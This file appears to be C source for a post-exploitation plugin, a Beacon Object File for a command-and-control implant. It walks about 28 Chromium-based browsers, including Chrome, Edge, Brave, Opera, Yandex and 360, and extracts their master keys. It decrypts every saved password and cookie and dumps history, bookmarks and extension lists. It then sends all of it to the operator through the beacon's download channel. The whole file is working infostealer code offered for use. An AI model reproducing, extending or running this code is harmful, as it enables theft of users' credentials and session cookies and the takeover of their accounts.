#include "plg_common.h"

typedef struct {
	const char *tag;
	int appdata;
	const char *relpath;
	int is360;
} br_entry_t;

static const br_entry_t k_chromium_browsers[] = {
	{ "Chrome", 0, "Google\\Chrome\\User Data", 0 },
	{ "Chrome_Beta", 0, "Google\\Chrome Beta\\User Data", 0 },
	{ "Chromium", 0, "Chromium\\User Data", 0 },
	{ "Chrome_SxS", 0, "Google\\Chrome SxS\\User Data", 0 },
	{ "Edge", 0, "Microsoft\\Edge\\User Data", 0 },
	{ "Edge_Beta", 0, "Microsoft\\Edge Beta\\User Data", 0 },
	{ "Edge_Dev", 0, "Microsoft\\Edge Dev\\User Data", 0 },
	{ "Edge_Canary", 0, "Microsoft\\Edge SxS\\User Data", 0 },
	{ "Brave", 0, "BraveSoftware\\Brave-Browser\\User Data", 0 },
	{ "QQBrowser", 0, "Tencent\\QQBrowser\\User Data", 0 },
	{ "SogouExplorer", 0, "Sogou\\SogouExplorer\\User Data", 0 },
	{ "360ChromeX", 0, "360ChromeX\\Chrome\\User Data", 1 },
	{ "360Chrome", 0, "360Chrome\\Chrome\\User Data", 1 },
	{ "Vivaldi", 0, "Vivaldi\\User Data", 0 },
	{ "CocCoc", 0, "CocCoc\\Browser\\User Data", 0 },
	{ "Torch", 0, "Torch\\User Data", 0 },
	{ "Kometa", 0, "Kometa\\User Data", 0 },
	{ "Orbitum", 0, "Orbitum\\User Data", 0 },
	{ "CentBrowser", 0, "CentBrowser\\User Data", 0 },
	{ "7Star", 0, "7Star\\7Star\\User Data", 0 },
	{ "Sputnik", 0, "Sputnik\\Sputnik\\User Data", 0 },
	{ "Epic", 0, "Epic Privacy Browser\\User Data", 0 },
	{ "Uran", 0, "uCozMedia\\Uran\\User Data", 0 },
	{ "Yandex", 0, "Yandex\\YandexBrowser\\User Data", 0 },
	{ "Iridium", 0, "Iridium\\User Data", 0 },
	{ "Opera", 1, "Opera Software\\Opera Stable", 0 },
	{ "Opera_GX", 1, "Opera Software\\Opera GX Stable", 0 },
	{ "TheWorld", 0, "theworld6\\User Data", 0 },
};

static int pjoin(char *o, size_t z, const char *a, const char *b) {
	int n = MSVCRT$_snprintf(o, z, "%s\\%s", a, b);
	return (n > 0 && (size_t)n < z) ? 0 : -1;
}

static void fmt_line(formatp *f, const char *s) {
	if (s)
		BeaconFormatPrintf(f, "%s", s);
}

static void plg_proc_logins(const char *tag, const char *prof, const unsigned char *mk,
	formatp *fpw, const char *loginDataPath) {
	unsigned char *raw = NULL;
	DWORD rlen = 0;
	PlgSqlite *db;
	int i, n;
	char hdr[256];
	if (plg_read_file_a(loginDataPath, &raw, &rlen) < 0)
		return;
	db = plg_sqlite_open(raw, rlen);
	plg_free(raw);
	if (!db)
		return;
	if (plg_sqlite_read_table(db, "logins") < 0) {
		plg_sqlite_close(db);
		return;
	}
	MSVCRT$_snprintf(hdr, sizeof(hdr), "\n=== %s / %s / passwords ===\n", tag, prof);
	fmt_line(fpw, hdr);
	n = plg_sqlite_row_count(db);
	for (i = 0; i < n; i++) {
		const char *url = plg_sqlite_get(db, i, "origin_url");
		const char *user = plg_sqlite_get(db, i, "username_value");
		const char *pwenc = plg_sqlite_get(db, i, "password_value");
		unsigned char dec[4096];
		size_t decl = sizeof(dec);
		if (!url || !pwenc)
			continue;
		if (plg_chrome_decrypt(mk, pwenc, NULL, 0, dec, &decl, 1) < 0)
			continue;
		dec[decl < sizeof(dec) - 1 ? decl : sizeof(dec) - 1] = 0;
		BeaconFormatPrintf(fpw, "\t[URL] -> {%s}\n\t[USERNAME] -> {%s}\n\t[PASSWORD] -> {%s}\n\n",
		    url, user ? user : "", (char *)dec);
	}
	plg_sqlite_close(db);
}

static void plg_proc_cookies(const char *tag, const char *prof, const unsigned char *mk,
	formatp *fck, const char *ckpath) {
	unsigned char *raw = NULL;
	DWORD rlen = 0;
	PlgSqlite *db;
	int i, n;
	char hdr[256];
	if (plg_read_file_a(ckpath, &raw, &rlen) < 0)
		return;
	db = plg_sqlite_open(raw, rlen);
	plg_free(raw);
	if (!db)
		return;
	if (plg_sqlite_read_table(db, "cookies") < 0) {
		plg_sqlite_close(db);
		return;
	}
	MSVCRT$_snprintf(hdr, sizeof(hdr), "\n=== %s / %s / cookies (JSON-like) ===\n", tag, prof);
	fmt_line(fck, hdr);
	n = plg_sqlite_row_count(db);
	for (i = 0; i < n; i++) {
		const char *host = plg_sqlite_get(db, i, "host_key");
		const char *name = plg_sqlite_get(db, i, "name");
		const char *path = plg_sqlite_get(db, i, "path");
		const char *ev = plg_sqlite_get(db, i, "encrypted_value");
		const char *exp = plg_sqlite_get(db, i, "expires_utc");
		unsigned char dec[8192];
		size_t decl = sizeof(dec);
		double expd = 0;
		if (!host || !name || !ev)
			continue;
		if (plg_chrome_decrypt(mk, ev, NULL, 0, dec, &decl, 1) < 0)
			continue;
		dec[decl < sizeof(dec) - 1 ? decl : sizeof(dec) - 1] = 0;
		if (exp) {
			unsigned long long eu = MSVCRT$strtoul(exp, NULL, 10);
			if (eu > 11644473600000000ULL)
				expd = (double)((long long)(eu / 1000000 - 11644473600000000LL) / 1000000.0 - 11644473600.0);
		}
		BeaconFormatPrintf(fck,
		    "{\n    \"domain\": \"%s\",\n    \"expirationDate\": %.6f,\n    \"name\": \"%s\",\n    \"path\": \"%s\",\n    \"value\": \"%s\"\n},\n",
		    host, expd, name, path ? path : "/", (char *)dec);
	}
	plg_sqlite_close(db);
}

static void plg_proc_history(const char *tag, const char *prof, formatp *fh, const char *histpath) {
	unsigned char *raw = NULL;
	DWORD rlen = 0;
	PlgSqlite *db;
	int i, n;
	char hdr[256];
	if (plg_read_file_a(histpath, &raw, &rlen) < 0)
		return;
	db = plg_sqlite_open(raw, rlen);
	plg_free(raw);
	if (!db)
		return;
	if (plg_sqlite_read_table(db, "urls") < 0) {
		plg_sqlite_close(db);
		return;
	}
	MSVCRT$_snprintf(hdr, sizeof(hdr), "\n=== %s / %s / history ===\n", tag, prof);
	fmt_line(fh, hdr);
	n = plg_sqlite_row_count(db);
	for (i = 0; i < n; i++) {
		const char *u = plg_sqlite_get(db, i, "url");
		if (u)
			BeaconFormatPrintf(fh, "%s\n", u);
	}
	plg_sqlite_close(db);
}

static void plg_proc_bookmarks_file(formatp *fb, const char *tag, const char *prof, const char *bpath) {
	unsigned char *raw = NULL;
	DWORD rlen = 0;
	char hdr[256];
	if (plg_read_file_a(bpath, &raw, &rlen) < 0)
		return;
	MSVCRT$_snprintf(hdr, sizeof(hdr), "\n=== %s / %s / bookmarks (raw JSON) ===\n", tag, prof);
	fmt_line(fb, hdr);
	{
		DWORD cap = rlen < 4 * 1024 * 1024 ? rlen : 4 * 1024 * 1024;
		raw[cap] = 0;
	}
	BeaconFormatPrintf(fb, "%s\n", (char *)raw);
	plg_free(raw);
}

static int dir_exists(const char *p) {
	DWORD a = KERNEL32$GetFileAttributesA(p);
	return (a != INVALID_FILE_ATTRIBUTES && (a & FILE_ATTRIBUTE_DIRECTORY));
}

static void out_fname(char *dst, size_t dz, const char *prefix, const char *suffix) {
	if (prefix && prefix[0])
		MSVCRT$_snprintf(dst, dz, "%s_%s", prefix, suffix);
	else
		MSVCRT$_snprintf(dst, dz, "%s", suffix);
}

static void manifest_pick_name(const unsigned char *buf, DWORD len, char *name, size_t nsz) {
	const char *p, *q;
	name[0] = 0;
	if (!buf || len < 8)
		return;
	p = MSVCRT$strstr((char *)buf, "\"name\"");
	if (!p)
		return;
	p = MSVCRT$strchr(p, ':');
	if (!p)
		return;
	p++;
	while (*p == ' ' || *p == '\t' || *p == '\r' || *p == '\n')
		p++;
	if (*p != '"')
		return;
	p++;
	q = p;
	while (*q && *q != '"' && (size_t)(q - p) < nsz - 1)
		q++;
	MSVCRT$memcpy(name, p, (size_t)(q - p));
	name[q - p] = 0;
}

static void plg_proc_extensions(const char *tag, const char *prof, formatp *fex, const char *profroot) {
	char extroot[PLG_MAX_PATH], idpath[PLG_MAX_PATH], verspat[PLG_MAX_PATH], manpath[PLG_MAX_PATH];
	WIN32_FIND_DATAA fd, vfd;
	HANDLE h, hv;
	char hdr[256];
	MSVCRT$_snprintf(hdr, sizeof(hdr), "\n=== %s / %s / extensions ===\n", tag, prof);
	fmt_line(fex, hdr);
	if (pjoin(extroot, sizeof(extroot), profroot, "Extensions") != 0)
		return;
	if (!dir_exists(extroot))
		return;
	if (pjoin(verspat, sizeof(verspat), extroot, "*") != 0)
		return;
	h = KERNEL32$FindFirstFileA(verspat, &fd);
	if (h == INVALID_HANDLE_VALUE)
		return;
	do {
		char extid[128], name[256];
		unsigned char *mbuf = NULL;
		DWORD mlen = 0;
		if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))
			continue;
		if (fd.cFileName[0] == '.')
			continue;
		if (pjoin(idpath, sizeof(idpath), extroot, fd.cFileName) != 0)
			continue;
		if (pjoin(verspat, sizeof(verspat), idpath, "*") != 0)
			continue;
		hv = KERNEL32$FindFirstFileA(verspat, &vfd);
		if (hv == INVALID_HANDLE_VALUE)
			continue;
		if (!(vfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
			KERNEL32$FindClose(hv);
			continue;
		}
		if (pjoin(manpath, sizeof(manpath), idpath, vfd.cFileName) != 0) {
			KERNEL32$FindClose(hv);
			continue;
		}
		if (pjoin(manpath, sizeof(manpath), manpath, "manifest.json") != 0) {
			KERNEL32$FindClose(hv);
			continue;
		}
		KERNEL32$FindClose(hv);
		MSVCRT$strncpy(extid, fd.cFileName, sizeof(extid) - 1);
		extid[sizeof(extid) - 1] = 0;
		if (plg_read_file_a(manpath, &mbuf, &mlen) < 0)
			continue;
		if (mlen > 65536)
			mlen = 65536;
		manifest_pick_name(mbuf, mlen, name, sizeof(name));
		plg_free(mbuf);
		BeaconFormatPrintf(fex, "%s %s\n", extid, name[0] ? name : "?");
	} while (KERNEL32$FindNextFileA(h, &fd));
	KERNEL32$FindClose(h);
}

void plg_process_all_chromium(const char *localappdata, const char *appdata, const char *file_prefix) {
	unsigned int bi;
	for (bi = 0; bi < sizeof(k_chromium_browsers) / sizeof(k_chromium_browsers[0]); bi++) {
		const br_entry_t *e = &k_chromium_browsers[bi];
		const char *base = e->appdata ? appdata : localappdata;
		char root[PLG_MAX_PATH];
		char ls[PLG_MAX_PATH];
		unsigned char mk[32];
		formatp fpw, fck, fh, fb, fex;
		int pi;
		char profs[PLG_MAX_PROFILES][64];
		int nprof = 0;
		if (pjoin(root, sizeof(root), base, e->relpath) != 0)
			continue;
		if (!dir_exists(root))
			continue;
		if (pjoin(ls, sizeof(ls), root, "Local State") != 0)
			continue;
		if (plg_chrome_master_key(ls, mk) < 0)
			continue;
		MSVCRT$strcpy(profs[nprof++], "Default");
		for (pi = 1; pi < 100 && nprof < PLG_MAX_PROFILES; pi++) {
			char pd[PLG_MAX_PATH];
			char pname[32];
			MSVCRT$_snprintf(pname, sizeof(pname), "Profile %d", pi);
			if (pjoin(pd, sizeof(pd), root, pname) == 0 && dir_exists(pd))
				MSVCRT$strcpy(profs[nprof++], pname);
		}
		if (nprof < PLG_MAX_PROFILES) {
			char gpd[PLG_MAX_PATH];
			if (pjoin(gpd, sizeof(gpd), root, "Guest Profile") == 0 && dir_exists(gpd))
				MSVCRT$strcpy(profs[nprof++], "Guest Profile");
		}
		BeaconFormatAlloc(&fpw, 512 * 1024);
		BeaconFormatAlloc(&fck, 1024 * 1024);
		BeaconFormatAlloc(&fh, 512 * 1024);
		BeaconFormatAlloc(&fb, 512 * 1024);
		BeaconFormatAlloc(&fex, 256 * 1024);
		for (pi = 0; pi < nprof; pi++) {
			char profroot[PLG_MAX_PATH], loginpath[PLG_MAX_PATH], ck[PLG_MAX_PATH], hist[PLG_MAX_PATH], bm[PLG_MAX_PATH];
			const char *prof = profs[pi];
			if (pjoin(profroot, sizeof(profroot), root, prof) != 0)
				continue;
			if (pjoin(loginpath, sizeof(loginpath), profroot, "Login Data") != 0)
				continue;
			plg_proc_logins(e->tag, prof, mk, &fpw, loginpath);
			if (pjoin(ck, sizeof(ck), profroot, "Network\\Cookies") == 0 &&
			    KERNEL32$GetFileAttributesA(ck) != INVALID_FILE_ATTRIBUTES)
				plg_proc_cookies(e->tag, prof, mk, &fck, ck);
			else if (pjoin(ck, sizeof(ck), profroot, "Cookies") == 0)
				plg_proc_cookies(e->tag, prof, mk, &fck, ck);
			if (e->is360)
				pjoin(hist, sizeof(hist), profroot, "360History");
			else
				pjoin(hist, sizeof(hist), profroot, "History");
			plg_proc_history(e->tag, prof, &fh, hist);
			if (e->is360)
				pjoin(bm, sizeof(bm), profroot, "360Bookmarks");
			else
				pjoin(bm, sizeof(bm), profroot, "Bookmarks");
			plg_proc_bookmarks_file(&fb, e->tag, prof, bm);
			plg_proc_extensions(e->tag, prof, &fex, profroot);
		}
		{
			int sz;
			char name[160];
			char sfx[96];
			char *data;
			MSVCRT$_snprintf(sfx, sizeof(sfx), "%s_passwords.txt", e->tag);
			out_fname(name, sizeof(name), file_prefix, sfx);
			data = BeaconFormatToString(&fpw, &sz);
			if (data && sz > 16)
				AxDownloadMemory(name, data, sz);
			BeaconFormatFree(&fpw);
			MSVCRT$_snprintf(sfx, sizeof(sfx), "%s_cookies.txt", e->tag);
			out_fname(name, sizeof(name), file_prefix, sfx);
			data = BeaconFormatToString(&fck, &sz);
			if (data && sz > 16)
				AxDownloadMemory(name, data, sz);
			BeaconFormatFree(&fck);
			MSVCRT$_snprintf(sfx, sizeof(sfx), "%s_history.txt", e->tag);
			out_fname(name, sizeof(name), file_prefix, sfx);
			data = BeaconFormatToString(&fh, &sz);
			if (data && sz > 16)
				AxDownloadMemory(name, data, sz);
			BeaconFormatFree(&fh);
			MSVCRT$_snprintf(sfx, sizeof(sfx), "%s_bookmarks.txt", e->tag);
			out_fname(name, sizeof(name), file_prefix, sfx);
			data = BeaconFormatToString(&fb, &sz);
			if (data && sz > 16)
				AxDownloadMemory(name, data, sz);
			BeaconFormatFree(&fb);
			MSVCRT$_snprintf(sfx, sizeof(sfx), "%s_extension.txt", e->tag);
			out_fname(name, sizeof(name), file_prefix, sfx);
			data = BeaconFormatToString(&fex, &sz);
			if (data && sz > 32)
				AxDownloadMemory(name, data, sz);
			BeaconFormatFree(&fex);
		}
		BeaconPrintf(CALLBACK_OUTPUT, "[+] Chromium family: %s", e->tag);
	}
}
